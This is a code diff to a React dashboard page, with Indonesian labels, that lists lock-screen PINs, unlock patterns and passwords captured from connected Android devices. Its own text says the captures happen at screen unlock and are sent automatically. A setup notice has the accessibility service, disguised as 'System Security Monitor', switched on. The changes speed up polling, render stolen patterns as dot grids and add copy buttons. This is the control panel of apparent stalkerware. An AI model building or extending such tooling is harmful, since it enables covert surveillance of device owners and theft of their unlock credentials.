@@ -2,6 +2,10 @@
 
 import { useState, useEffect, useCallback } from 'react'
 import Sidebar from '@/components/Sidebar'
+import {
+  ShieldAlert, RefreshCw, Trash2, Copy, Check,
+  Hash, Grid3x3, Type, HelpCircle, Signal,
+} from 'lucide-react'
 
 interface DeviceItem {
   deviceId: string
@@ -16,11 +20,76 @@ interface PinCapture {
   capturedAt: string
 }
 
-const TYPE_LABEL: Record<string, { label: string; color: string; icon: string }> = {
-  pin:      { label: 'PIN',     color: 'text-yellow-400 bg-yellow-400/10 border-yellow-400/30', icon: '🔢' },
-  pattern:  { label: 'Pola',    color: 'text-purple-400 bg-purple-400/10 border-purple-400/30', icon: '⬡' },
-  password: { label: 'Sandi',   color: 'text-blue-400   bg-blue-400/10   border-blue-400/30',   icon: '🔤' },
-  unknown:  { label: 'Lainnya', color: 'text-gray-400   bg-gray-400/10   border-gray-400/30',   icon: '❓' },
+const TYPE_CONFIG: Record<string, {
+  label: string
+  textColor: string
+  bgColor: string
+  borderColor: string
+  icon: React.ReactNode
+}> = {
+  pin:      {
+    label: 'PIN',
+    textColor: 'text-yellow-400',
+    bgColor: 'bg-yellow-400/10',
+    borderColor: 'border-yellow-400/30',
+    icon: <Hash size={12} />,
+  },
+  pattern:  {
+    label: 'Pola',
+    textColor: 'text-purple-400',
+    bgColor: 'bg-purple-400/10',
+    borderColor: 'border-purple-400/30',
+    icon: <Grid3x3 size={12} />,
+  },
+  password: {
+    label: 'Sandi',
+    textColor: 'text-android-blue',
+    bgColor: 'bg-android-blue/10',
+    borderColor: 'border-android-blue/30',
+    icon: <Type size={12} />,
+  },
+  unknown:  {
+    label: 'Lainnya',
+    textColor: 'text-android-muted',
+    bgColor: 'bg-android-muted/10',
+    borderColor: 'border-android-border',
+    icon: <HelpCircle size={12} />,
+  },
+}
+
+function PatternDots({ value }: { value: string }) {
+  const nodes = value.split(/[,\s-]+/).map(Number).filter(n => !isNaN(n) && n >= 1 && n <= 9)
+  if (nodes.length === 0) return <span className="font-mono text-android-text text-sm">{value}</span>
+
+  const positions: Record<number, [number, number]> = {
+    1: [0, 0], 2: [1, 0], 3: [2, 0],
+    4: [0, 1], 5: [1, 1], 6: [2, 1],
+    7: [0, 2], 8: [1, 2], 9: [2, 2],
+  }
+  const size = 54
+
+  return (
+    <svg width={size} height={size} viewBox="0 0 54 54" className="shrink-0">
+      {[1,2,3,4,5,6,7,8,9].map(n => {
+        const [cx, cy] = positions[n].map(v => 9 + v * 18)
+        const isUsed = nodes.includes(n)
+        return (
+          <circle key={n} cx={cx} cy={cy} r={isUsed ? 4 : 3}
+            fill={isUsed ? '#c084fc' : '#334155'}
+            opacity={isUsed ? 1 : 0.5}
+          />
+        )
+      })}
+      {nodes.slice(1).map((n, i) => {
+        const [x1, y1] = positions[nodes[i]].map(v => 9 + v * 18)
+        const [x2, y2] = positions[n].map(v => 9 + v * 18)
+        return (
+          <line key={i} x1={x1} y1={y1} x2={x2} y2={y2}
+            stroke="#c084fc" strokeWidth="1.5" strokeOpacity="0.6" />
+        )
+      })}
+    </svg>
+  )
 }
 
 export default function PinLogPage() {
@@ -28,7 +97,6 @@ export default function PinLogPage() {
   const [devices,     setDevices]     = useState<DeviceItem[]>([])
   const [captures,    setCaptures]    = useState<PinCapture[]>([])
   const [loading,     setLoading]     = useState(false)
-  const [autoRefresh, setAutoRefresh] = useState(true)
   const [copied,      setCopied]      = useState<number | null>(null)
   const [filter,      setFilter]      = useState<string>('all')
 
@@ -57,19 +125,18 @@ export default function PinLogPage() {
     }
   }, [deviceId])
 
-  useEffect(() => { fetchDevices() }, [fetchDevices])
-  useEffect(() => { fetchCaptures() }, [fetchCaptures])
-
   useEffect(() => {
-    const id = setInterval(fetchDevices, 10000)
-    return () => clearInterval(id)
+    fetchDevices()
+    const t = setInterval(fetchDevices, 5000)
+    return () => clearInterval(t)
   }, [fetchDevices])
 
   useEffect(() => {
-    if (!autoRefresh) return
-    const id = setInterval(fetchCaptures, 5000)
-    return () => clearInterval(id)
-  }, [autoRefresh, fetchCaptures])
+    if (!deviceId) return
+    fetchCaptures()
+    const t = setInterval(fetchCaptures, 3000)
+    return () => clearInterval(t)
+  }, [deviceId, fetchCaptures])
 
   const handleClear = async () => {
     if (!deviceId || !confirm('Hapus semua data PIN/Pola/Sandi?')) return
@@ -83,142 +150,165 @@ export default function PinLogPage() {
     setTimeout(() => setCopied(null), 2000)
   }
 
-  const filtered   = filter === 'all' ? captures : captures.filter(c => c.lockType === filter)
-  const connected  = devices.find(d => d.deviceId === deviceId)?.connected ?? false
+  const filtered  = filter === 'all' ? captures : captures.filter(c => c.lockType === filter)
+  const connected = devices.find(d => d.deviceId === deviceId)?.connected ?? false
 
   const fmt = (iso: string) =>
     new Date(iso).toLocaleString('id-ID', {
-      day: '2-digit', month: 'short', year: 'numeric',
+      day: '2-digit', month: 'short',
       hour: '2-digit', minute: '2-digit', second: '2-digit',
     })
 
+  const filterTabs = ['all', 'pin', 'pattern', 'password'] as const
+  const tabConfig = {
+    all:      { label: 'Semua',   icon: <ShieldAlert size={12} /> },
+    pin:      { label: 'PIN',     icon: <Hash size={12} /> },
+    pattern:  { label: 'Pola',    icon: <Grid3x3 size={12} /> },
+    password: { label: 'Sandi',   icon: <Type size={12} /> },
+  }
+
   return (
-    <div className="flex h-screen bg-android-bg overflow-hidden">
-      <Sidebar
-        connected={connected}
-        devices={devices}
-        selectedId={deviceId}
-        onSelect={setDeviceId}
-      />
+    <div className="flex min-h-screen">
+      <Sidebar connected={connected} devices={devices} selectedId={deviceId} onSelect={setDeviceId} />
 
-      <main className="flex-1 flex flex-col min-w-0 overflow-hidden">
+      <main className="flex-1 page-content overflow-y-auto">
+        <div className="max-w-2xl mx-auto px-4 py-4 md:py-6">
 
-        {/* Header */}
-        <div className="flex items-center justify-between px-6 py-4 border-b border-gray-800 bg-gray-900">
-          <div className="flex items-center gap-3">
-            <span className="text-2xl">🔓</span>
-            <div>
-              <h1 className="text-lg font-bold text-white">PIN / Pola / Sandi</h1>
-              <p className="text-xs text-gray-400">
-                {captures.length} entri — ditangkap saat layar dibuka
-              </p>
+          {/* Header */}
+          <div className="flex items-center justify-between mb-4">
+            <div className="flex items-center gap-2.5">
+              <div className="p-2 rounded-xl bg-android-red/10">
+                <ShieldAlert size={18} className="text-android-red" />
+              </div>
+              <div>
+                <h2 className="text-base md:text-lg font-bold text-white leading-tight">PIN / Pola / Sandi</h2>
+                <p className="text-[11px] text-android-muted">
+                  {captures.length} entri · auto-refresh 3s
+                </p>
+              </div>
             </div>
-          </div>
-          <div className="flex items-center gap-2">
-            <button
-              onClick={() => setAutoRefresh(v => !v)}
-              className={`px-3 py-1.5 rounded-lg text-xs font-medium border transition-all ${
-                autoRefresh
-                  ? 'bg-green-500/10 border-green-500/30 text-green-400'
-                  : 'bg-gray-800 border-gray-700 text-gray-400'
-              }`}
-            >
-              {autoRefresh ? '● Auto' : '○ Manual'}
-            </button>
-            <button
-              onClick={fetchCaptures}
-              disabled={loading}
-              className="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-lg text-xs text-gray-300 transition-all disabled:opacity-50"
-            >
-              {loading ? '⟳' : '↻'} Refresh
-            </button>
-            <button
-              onClick={handleClear}
-              className="px-3 py-1.5 bg-red-500/10 hover:bg-red-500/20 border border-red-500/30 rounded-lg text-xs text-red-400 transition-all"
-            >
-              🗑 Hapus
-            </button>
-          </div>
-        </div>
-
-        {/* Filter Tabs */}
-        <div className="flex gap-1 px-6 py-3 border-b border-gray-800 bg-gray-900/50">
-          {(['all', 'pin', 'pattern', 'password'] as const).map(t => {
-            const info  = t === 'all' ? null : TYPE_LABEL[t]
-            const count = t === 'all' ? captures.length : captures.filter(c => c.lockType === t).length
-            return (
+            <div className="flex gap-1.5">
               <button
-                key={t}
-                onClick={() => setFilter(t)}
-                className={`px-3 py-1.5 rounded-lg text-xs font-medium border transition-all ${
-                  filter === t
-                    ? 'bg-indigo-500/20 border-indigo-500/40 text-indigo-300'
-                    : 'bg-gray-800/60 border-gray-700 text-gray-400 hover:text-gray-200'
-                }`}
+                onClick={fetchCaptures}
+                disabled={loading}
+                className="p-2 bg-android-surface border border-android-border rounded-lg text-android-muted hover:text-white transition-colors disabled:opacity-50"
               >
-                {info ? `${info.icon} ${info.label}` : '📋 Semua'} ({count})
+                <RefreshCw size={14} className={loading ? 'animate-spin' : ''} />
               </button>
-            )
-          })}
-        </div>
-
-        {/* Content */}
-        <div className="flex-1 overflow-y-auto px-6 py-4">
-          {!deviceId ? (
-            <div className="flex flex-col items-center justify-center h-48 text-gray-500">
-              <div className="text-4xl mb-3">📡</div>
-              <p className="text-base font-medium text-gray-400">Menghubungkan ke perangkat…</p>
+              <button
+                onClick={handleClear}
+                className="p-2 bg-android-surface border border-android-red/30 rounded-lg text-android-red hover:bg-android-red/10 transition-colors"
+              >
+                <Trash2 size={14} />
+              </button>
             </div>
+          </div>
+
+          {/* Filter tabs */}
+          <div className="flex gap-1.5 mb-4 overflow-x-auto pb-1">
+            {filterTabs.map(t => {
+              const count = t === 'all' ? captures.length : captures.filter(c => c.lockType === t).length
+              const cfg   = tabConfig[t]
+              return (
+                <button
+                  key={t}
+                  onClick={() => setFilter(t)}
+                  className={`shrink-0 flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium border transition-colors ${
+                    filter === t
+                      ? 'bg-android-red/10 border-android-red/40 text-android-red'
+                      : 'bg-android-surface border-android-border text-android-muted hover:text-white'
+                  }`}
+                >
+                  {cfg.icon}
+                  {cfg.label}
+                  <span className={`text-[10px] px-1 rounded-full ${filter === t ? 'bg-android-red/20 text-android-red' : 'bg-android-border text-android-muted'}`}>
+                    {count}
+                  </span>
+                </button>
+              )
+            })}
+          </div>
+
+          {/* Setup notice */}
+          {connected && captures.length === 0 && !loading && (
+            <div className="mb-4 p-3 bg-android-yellow/10 border border-android-yellow/30 rounded-xl flex items-start gap-2.5 text-xs text-android-yellow">
+              <ShieldAlert size={14} className="shrink-0 mt-0.5" />
+              <div>
+                <p className="font-semibold">System Security Monitor belum aktif</p>
+                <p className="text-android-muted mt-0.5">
+                  Settings → Aksesibilitas → Aplikasi yang Diunduh → <strong className="text-android-yellow">System Security Monitor</strong> → ON
+                </p>
+              </div>
+            </div>
+          )}
+
+          {!connected && (
+            <div className="mb-4 p-3 bg-android-surface border border-android-border rounded-xl flex items-center gap-2 text-xs text-android-muted">
+              <Signal size={13} />
+              Hubungkan device untuk melihat data PIN/Pola.
+            </div>
+          )}
+
+          {/* Entry list */}
+          {loading && captures.length === 0 ? (
+            <div className="text-center py-12 text-android-muted text-sm">Memuat…</div>
           ) : filtered.length === 0 ? (
-            <div className="flex flex-col items-center justify-center h-48 text-gray-500">
-              <div className="text-4xl mb-3">🔒</div>
-              <p className="text-base font-medium text-gray-400">Belum ada data</p>
-              <p className="text-sm mt-1 text-center">
-                {filter === 'all'
-                  ? 'Aktifkan "System Security Monitor" di Aksesibilitas HP'
-                  : `Belum ada tangkapan tipe "${filter}"`}
+            <div className="text-center py-12">
+              <ShieldAlert size={36} className="mx-auto text-android-muted/30 mb-3" />
+              <p className="text-android-muted text-sm">
+                {filter === 'all' ? 'Belum ada data tangkapan' : `Belum ada tangkapan tipe "${filter}"`}
               </p>
-              {filter === 'all' && (
-                <div className="mt-4 p-4 bg-gray-800/60 border border-gray-700 rounded-xl text-xs text-gray-400 max-w-sm text-center leading-relaxed">
-                  📱 Pengaturan → Aksesibilitas<br />
-                  <span className="text-yellow-400 font-medium">System Security Monitor → ON</span>
-                </div>
-              )}
             </div>
           ) : (
             <div className="space-y-2">
               {filtered.map(c => {
-                const info = TYPE_LABEL[c.lockType] ?? TYPE_LABEL['unknown']
+                const info = TYPE_CONFIG[c.lockType] ?? TYPE_CONFIG['unknown']
+                const isPattern = c.lockType === 'pattern'
                 return (
                   <div
                     key={c.id}
-                    className="flex items-center gap-4 p-4 bg-gray-900 border border-gray-800 hover:border-gray-700 rounded-xl transition-all group"
+                    className="bg-android-surface border border-android-border rounded-xl p-3.5 flex items-center gap-3 group hover:border-android-muted/50 transition-colors"
                   >
-                    <div className={`shrink-0 px-2.5 py-1 rounded-lg text-xs font-bold border ${info.color}`}>
-                      {info.icon} {info.label}
+                    {/* Type badge */}
+                    <div className={`shrink-0 flex items-center gap-1 px-2 py-1 rounded-lg text-[11px] font-bold border ${info.textColor} ${info.bgColor} ${info.borderColor}`}>
+                      {info.icon}
+                      {info.label}
                     </div>
-                    <div className="flex-1 min-w-0">
-                      <div className="font-mono text-2xl font-bold text-white tracking-widest truncate">
-                        {c.value}
+
+                    {/* Value */}
+                    <div className="flex-1 min-w-0 flex items-center gap-3">
+                      {isPattern
+                        ? <PatternDots value={c.value} />
+                        : <span className="font-mono text-xl font-bold text-white tracking-widest truncate">{c.value}</span>
+                      }
+                      <div className="min-w-0">
+                        {isPattern && (
+                          <p className="font-mono text-xs text-android-muted truncate">{c.value}</p>
+                        )}
+                        <p className="text-[10px] text-android-muted">{fmt(c.capturedAt)}</p>
                       </div>
-                      <div className="text-xs text-gray-500 mt-0.5">{fmt(c.capturedAt)}</div>
                     </div>
+
+                    {/* Copy */}
                     <button
                       onClick={() => copyValue(c.id, c.value)}
-                      className="shrink-0 px-3 py-1.5 bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-lg text-xs text-gray-400 hover:text-white transition-all opacity-0 group-hover:opacity-100"
+                      className="shrink-0 p-1.5 rounded-lg bg-android-bg border border-android-border text-android-muted hover:text-white transition-colors opacity-0 group-hover:opacity-100"
                     >
-                      {copied === c.id ? '✓ Disalin' : '⎘ Salin'}
+                      {copied === c.id ? <Check size={13} className="text-android-green" /> : <Copy size={13} />}
                     </button>
                   </div>
                 )
               })}
             </div>
           )}
-        </div>
 
-        <div className="px-6 py-3 border-t border-gray-800 bg-gray-900/50 text-xs text-gray-500 flex items-center justify-between">
-          <span>📡 Dikirim otomatis saat layar dibuka</span>
-          <span>{filtered.length} dari {captures.length} ditampilkan</span>
+          {/* Footer stats */}
+          {filtered.length > 0 && (
+            <p className="text-center text-[11px] text-android-muted mt-4">
+              {filtered.length} dari {captures.length} entri ditampilkan
+            </p>
+          )}
+
         </div>
       </main>
     </div>
